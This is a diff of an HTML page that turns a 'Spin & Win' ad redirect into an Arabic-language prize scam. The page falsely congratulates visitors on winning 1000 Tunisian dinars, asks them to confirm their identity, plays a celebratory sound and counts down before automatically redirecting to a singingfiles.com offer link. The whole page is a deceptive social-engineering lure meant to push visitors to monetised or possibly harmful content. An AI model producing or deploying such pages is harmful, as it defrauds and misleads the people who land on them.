@@ -1,33 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Spin & Win</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>مبروك! ربحت 1000 دينار تونسي</title>
+  <meta property="og:title" content="مبروك! ربحت 1000 دينار تونسي!" />
+  <meta property="og:description" content="تم اختيارك للحصول على جائزة نقدية. اضغط لتأكيد هويتك." />
+  <meta property="og:image" content="https://i.imgur.com/3JQ6Z4N.png" />
   <style>
     body {
-      background: #1e1e2f;
-      color: #fff;
-      font-family: Arial, sans-serif;
+      font-family: 'Tahoma', sans-serif;
+      background: linear-gradient(to bottom, #ffecb3, #ffe082);
       text-align: center;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      padding: 50px 20px;
+      color: #333;
     }
-    h1 { font-size: 2.5em; margin-bottom: 0.3em; }
-    p { font-size: 1.2em; margin-bottom: 1em; }
+
+    h1 {
+      font-size: 28px;
+      color: #d32f2f;
+      margin-bottom: 20px;
+    }
+
+    .countdown {
+      font-size: 22px;
+      margin: 20px 0;
+      color: #555;
+    }
+
+    .btn {
+      display: inline-block;
+      background-color: #43a047;
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 8px;
+      text-decoration: none;
+      margin-top: 20px;
+    }
+
+    .btn:hover {
+      background-color: #388e3c;
+    }
   </style>
 </head>
 <body>
-  <h1>🎯 Spin the Wheel!</h1>
-  <p>Spinning... Please wait.</p>
+
+  <h1>🎉 مبروك! ربحت 1000 دينار تونسي 🎉</h1>
+  <p>لقد تم اختيارك عشوائيًا للحصول على جائزة نقدية.</p>
+  <div class="countdown" id="countdown">سيتم تحويلك خلال 5 ثوانٍ...</div>
+  <a href="https://singingfiles.com/show.php?l=0&u=2395961&id=54791" class="btn">اضغط لتأكيد واستلام الجائزة</a>
+
+  <audio autoplay>
+    <source src="https://cdn.pixabay.com/download/audio/2022/10/30/audio_615d4644b5.mp3?filename=success-1-6297.mp3" type="audio/mp3">
+  </audio>
 
   <script>
-    setTimeout(function() {
-      window.location.href = "https://popcash.net/world/go/489377/738925/";
-    }, 1000); // 1000 milliseconds = 1 second
+    let seconds = 5;
+    const countdown = document.getElementById('countdown');
+    const redirectURL = "https://singingfiles.com/show.php?l=0&u=2395961&id=54791";
+
+    const interval = setInterval(() => {
+      seconds--;
+      countdown.textContent = `سيتم تحويلك خلال ${seconds} ثوانٍ...`;
+      if (seconds <= 0) {
+        clearInterval(interval);
+        window.location.href = redirectURL;
+      }
+    }, 1000);
   </script>
 </body>
 </html>
